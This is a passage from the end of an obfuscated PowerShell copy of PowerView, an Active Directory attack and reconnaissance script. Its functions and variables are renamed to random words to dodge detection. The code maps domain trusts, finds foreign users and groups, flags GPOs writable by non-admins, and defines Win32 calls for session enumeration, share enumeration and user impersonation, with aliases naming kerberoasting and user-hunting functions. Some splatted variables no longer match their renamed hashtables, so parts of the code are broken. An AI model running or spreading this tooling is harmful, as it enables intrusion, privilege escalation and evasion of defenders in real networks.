        if ($PSBoundParameters['Forest']) { $RYyNPlEK99['Forest'] = $ZKthMMjt99 }
        if ($PSBoundParameters['Credential']) { $RYyNPlEK99['Credential'] = $gxazvivN99 }
        $ufraWpfu99 = ampere @NetForestArguments
        if ($ufraWpfu99) {
            $ufraWpfu99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function Syrians {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{}
        $PPosolen99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['Raw']) { $PPosolen99['Raw'] = $Raw }
    }
    PROCESS {
        township @SearcherArguments  | ForEach-Object {
            ForEach ($AjSokHtI99 in $_.memberof) {
                $Index = $AjSokHtI99.IndexOf('DC=')
                if ($Index) {
                    $BBaSdAsr99 = $($AjSokHtI99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $ECdAeYIK99 = $_.distinguishedname
                    $YgxTjQeQ99 = $ECdAeYIK99.IndexOf('DC=')
                    $ojqqfkye99 = $($_.distinguishedname.SubString($YgxTjQeQ99)) -replace 'DC=','' -replace ',','.'
                    if ($BBaSdAsr99 -ne $ojqqfkye99) {
                        $SZjbzmKX99 = $AjSokHtI99.Split(',')[0].split('=')[1]
                        $XRKpBIRs99 = New-Object PSObject
                        $XRKpBIRs99 | Add-Member Noteproperty 'UserDomain' $ojqqfkye99
                        $XRKpBIRs99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $XRKpBIRs99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $XRKpBIRs99 | Add-Member Noteproperty 'GroupDomain' $BBaSdAsr99
                        $XRKpBIRs99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
                        $XRKpBIRs99 | Add-Member Noteproperty 'GroupDistinguishedName' $AjSokHtI99
                        $XRKpBIRs99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $XRKpBIRs99
                    }
                }
            }
        }
    }
}
function Poiret {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{}
        $PPosolen99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['Raw']) { $PPosolen99['Raw'] = $Raw }
    }
    PROCESS {
        $zGCYpqeW99 = @('Users', 'Domain Users', 'Guests')
        burlap @SearcherArguments | Where-Object { $zGCYpqeW99 -notcontains $_.samaccountname } | ForEach-Object {
            $SZjbzmKX99 = $_.samAccountName
            $puEJpQFm99 = $_.distinguishedname
            $BBaSdAsr99 = $puEJpQFm99.SubString($puEJpQFm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $uuoLoDkc99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($BBaSdAsr99 -ne $uuoLoDkc99)) {
                    $sJRtMfdS99 = $_
                    $jKgysTLK99 = $_.Split(',')[0].split('=')[1]
                    $dogbYkZX99 = New-Object PSObject
                    $dogbYkZX99 | Add-Member Noteproperty 'GroupDomain' $BBaSdAsr99
                    $dogbYkZX99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
                    $dogbYkZX99 | Add-Member Noteproperty 'GroupDistinguishedName' $puEJpQFm99
                    $dogbYkZX99 | Add-Member Noteproperty 'MemberDomain' $uuoLoDkc99
                    $dogbYkZX99 | Add-Member Noteproperty 'MemberName' $jKgysTLK99
                    $dogbYkZX99 | Add-Member Noteproperty 'MemberDistinguishedName' $sJRtMfdS99
                    $dogbYkZX99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $dogbYkZX99
                }
            }
        }
    }
}
function sow {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $rPozaKft99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    $VuoFrjHb99 = @{}
    $mwZWbAYE99 = New-Object System.Collections.Stack
    $mUpijEWQ99 = @{}
    if ($PSBoundParameters['API']) { $mUpijEWQ99['API'] = $API }
    if ($PSBoundParameters['NET']) { $mUpijEWQ99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $mUpijEWQ99['LDAPFilter'] = $HOOTOEqu99 }
    if ($PSBoundParameters['Properties']) { $mUpijEWQ99['Properties'] = $SdzJuWMG99 }
    if ($PSBoundParameters['SearchBase']) { $mUpijEWQ99['SearchBase'] = $FNgTGwmR99 }
    if ($PSBoundParameters['Server']) { $mUpijEWQ99['Server'] = $mSxqoOjK99 }
    if ($PSBoundParameters['SearchScope']) { $mUpijEWQ99['SearchScope'] = $vaSWXjPs99 }
    if ($PSBoundParameters['ResultPageSize']) { $mUpijEWQ99['ResultPageSize'] = $mhcqrrQn99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $mUpijEWQ99['ServerTimeLimit'] = $mvTbAWDU99 }
    if ($PSBoundParameters['Tombstone']) { $mUpijEWQ99['Tombstone'] = $rPozaKft99 }
    if ($PSBoundParameters['Credential']) { $mUpijEWQ99['Credential'] = $gxazvivN99 }
    if ($PSBoundParameters['Credential']) {
        $XDmTsUoD99 = (debater -Credential $gxazvivN99).Name
    }
    else {
        $XDmTsUoD99 = (debater).Name
    }
    $mwZWbAYE99.Push($XDmTsUoD99)
    while($mwZWbAYE99.Count -ne 0) {
        $SSNUOPgW99 = $mwZWbAYE99.Pop()
        if ($SSNUOPgW99 -and ($SSNUOPgW99.Trim() -ne '') -and (-not $VuoFrjHb99.ContainsKey($SSNUOPgW99))) {
            Write-Verbose "[sow] Enumerating trusts for domain: '$SSNUOPgW99'"
            $Null = $VuoFrjHb99.Add($SSNUOPgW99, '')
            try {
                $mUpijEWQ99['Domain'] = $SSNUOPgW99
                $iZLnMGuv99 = cryogenics @DomainTrustArguments
                if ($iZLnMGuv99 -isnot [System.Array]) {
                    $iZLnMGuv99 = @($iZLnMGuv99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $hknhXjGf99 = @{}
                    if ($PSBoundParameters['Forest']) { $hknhXjGf99['Forest'] = $ZKthMMjt99 }
                    if ($PSBoundParameters['Credential']) { $hknhXjGf99['Credential'] = $gxazvivN99 }
                    $iZLnMGuv99 += victory @ForestTrustArguments
                }
                if ($iZLnMGuv99) {
                    if ($iZLnMGuv99 -isnot [System.Array]) {
                        $iZLnMGuv99 = @($iZLnMGuv99)
                    }
                    ForEach ($Trust in $iZLnMGuv99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $mwZWbAYE99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[sow] Error: $_"
            }
        }
    }
}
function Masonic {
    [CmdletBinding()]
    Param (
        [String]
        $cgXwtZoc99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $nkMakqBA99 = 200
    )
    $HqTCLlkF99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $ZKthMMjt99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $dzdXyOpe99 = @($ZKthMMjt99.Domains)
    $mwZWbAYE99 = $dzdXyOpe99 | foreach { $_.GetDirectoryEntry() }
    foreach ($SSNUOPgW99 in $mwZWbAYE99) {
        $kXbEpVCq99 = "(&(objectCategory=groupPolicyContainer)(displayname=$cgXwtZoc99))"
        $TbkLYEaJ99 = New-Object System.DirectoryServices.DirectorySearcher
        $TbkLYEaJ99.SearchRoot = $SSNUOPgW99
        $TbkLYEaJ99.Filter = $kXbEpVCq99
        $TbkLYEaJ99.PageSize = $nkMakqBA99
        $TbkLYEaJ99.SearchScope = "Subtree"
        $WzlkXBNF99 = $TbkLYEaJ99.FindAll()
        foreach ($gpo in $WzlkXBNF99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $HqTCLlkF99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $vIWNwJYm99 = New-Object psobject
            $vIWNwJYm99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $vIWNwJYm99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $vIWNwJYm99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $vIWNwJYm99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $vIWNwJYm99
        }
        }
    }
}
$Mod = canonical -ModuleName Win32
$FRRsEGRX99 = chivalrous $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$RAkiSvHr99 = chivalrous $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$oqUiXgaF99 = chivalrous $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$QUSTEbkG99 = chivalrous $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$lqYeGqBq99 = preconceives $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $QUSTEbkG99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$sKmvEYbz99 = preconceives $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$LHsSdVmM99 = preconceives $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$AYxUHfXy99 = preconceives $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$LsQgOFsN99 = preconceives $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$WVIZNIwi99 = chivalrous $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$glIboXpK99 = preconceives $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$AAOdZRRi99 = preconceives $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $WVIZNIwi99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = chivalrous $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$dhhSChGp99 = chivalrous $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$tuJeJXLW99 = chivalrous $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$ZELCewrO99 = preconceives $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $dhhSChGp99
    TrustAttributes = field 5 $tuJeJXLW99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$hMRxlbGU99 = preconceives $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($hMRxlbGU99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | counterclaims -Module $Mod -Namespace 'Win32'
$eIekXKWj99 = $Types['netapi32']
$hVuDLVbw99 = $Types['advapi32']
$ppPvwAgU99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress erupt
Set-Alias Convert-NameToSid gain
Set-Alias Convert-SidToName woodmen
Set-Alias Request-SPNTicket stiffens
Set-Alias Get-DNSZone dunces
Set-Alias Get-DNSRecord misinterpret
Set-Alias Get-NetDomain debater
Set-Alias Get-NetDomainController deplorably
Set-Alias Get-NetForest ampere
Set-Alias Get-NetForestDomain employing
Set-Alias Get-NetForestCatalog spontaneous
Set-Alias Get-NetUser township
Set-Alias Get-UserEvent niftiest
Set-Alias Get-NetComputer doubtlessly
Set-Alias Get-ADObject farrowing
Set-Alias Set-ADObject backlashes
Set-Alias Get-ObjectAcl pols
Set-Alias Add-ObjectAcl requirements
Set-Alias Invoke-ACLScanner voile
Set-Alias Get-GUIDMap fault
Set-Alias Get-NetOU ivies
Set-Alias Get-NetSite shoddiness
Set-Alias Get-NetSubnet pianissimi
Set-Alias Get-NetGroup burlap
Set-Alias Find-ManagedSecurityGroups flick
Set-Alias Get-NetGroupMember strippers
Set-Alias Get-NetFileServer furloughing
Set-Alias Get-DFSshare wheezes
Set-Alias Get-NetGPO roomfuls
Set-Alias Get-NetGPOGroup factoring
Set-Alias Find-GPOLocation designation
Set-Alias Find-GPOComputerAdmin mohair
Set-Alias Get-LoggedOnLocal deepening
Set-Alias Invoke-CheckLocalAdminAccess Abelson
Set-Alias Get-SiteName tussled
Set-Alias Get-Proxy Amritsar
Set-Alias Get-LastLoggedOn evangelize
Set-Alias Get-CachedRDPConnection mosque
Set-Alias Get-RegistryMountedDrive doughtier
Set-Alias Get-NetProcess console
Set-Alias Invoke-ThreadedFunction glorious
Set-Alias Invoke-UserHunter drinkers
Set-Alias Invoke-ProcessHunter snowshed
Set-Alias Invoke-EventHunter Valkyries
Set-Alias Invoke-ShareFinder Suwanee
Set-Alias Invoke-FileFinder indignantly
Set-Alias Invoke-EnumerateLocalAdmin strutting
Set-Alias Get-NetDomainTrust cryogenics
Set-Alias Get-NetForestTrust victory
Set-Alias Find-ForeignUser Syrians
Set-Alias Find-ForeignGroup Poiret
Set-Alias Invoke-MapDomainTrust sow
Set-Alias Get-DomainPolicy monograms
